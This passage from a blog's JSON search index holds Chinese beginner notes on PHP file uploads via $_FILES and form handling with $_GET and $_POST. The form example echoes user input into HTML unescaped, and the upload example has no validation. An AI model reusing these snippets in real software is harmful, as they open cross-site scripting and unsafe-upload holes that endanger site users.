&quot;&lt;br&gt;&quot;;\n    echo &quot;文件大小: &quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;] &#x2F; 1024) . &quot; kB&lt;br&gt;&quot;;\n    echo &quot;文件临时存储的位置: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];\n&#125;\n?&gt;\n\n\n\n通过使用 PHP 的全局数组 $_FILES，你可以从客户计算机向远程服务器上传文件。\n第一个参数是表单的 input name，第二个下标可以是 “name”、”type”、”size”、”tmp_name” 或 “error”。如下所示：\n\n$_FILES[“file”][“name”] - 上传文件的名称\n$_FILES[“file”][“type”] - 上传文件的类型\n$_FILES[“file”][“size”] - 上传文件的大小，以字节计\n$_FILES[“file”][“tmp_name”] - 存储在服务器的文件的临时副本的名称\n$_FILES[“file”][“error”] - 由文件上传导致的错误代码\n\n这是一种非常简单文件上传方式。基于安全方面的考虑，您应当增加有关允许哪些用户上传文件的限制。\n","slug":"03PHP文件","date":"2022-11-10T11:28:27.558Z","categories_index":"学习笔记","tags_index":"php","author_index":"Abyssaler"},{"id":"befd9437c19ef7fdb68a823928ac2872","title":"PHP表单","content":"PHP 中的 $_GET 和 $_POST 变量用于检索表单中的信息，比如用户输入\n&lt;html&gt;\n&lt;head&gt;\n&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;\n&lt;title&gt;菜鸟教程(runoob.com)&lt;&#x2F;title&gt;\n&lt;&#x2F;head&gt;\n&lt;body&gt;\n \n&lt;form action&#x3D;&quot;welcome.php&quot; method&#x3D;&quot;post&quot;&gt;\n名字: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;fname&quot;&gt;\n年龄: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;age&quot;&gt;\n&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&gt;\n&lt;&#x2F;form&gt;\n \n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n\n\n\n用户填写完上面的表单并点击提交按钮时，表单的数据会被送往名为 “welcome.php” 的 PHP 文件\n欢迎&lt;?php echo $_POST[&quot;fname&quot;]; ?&gt;!&lt;br&gt;\n你的年龄是 &lt;?php echo $_POST[&quot;age&quot;]; ?&gt;  岁。\n\n","slug":"02PHP表单","date":"2022-11-10T11:28:27.556Z","categories_index":"学习笔记","tags_index":"php","author_index":"Abyssaler"}]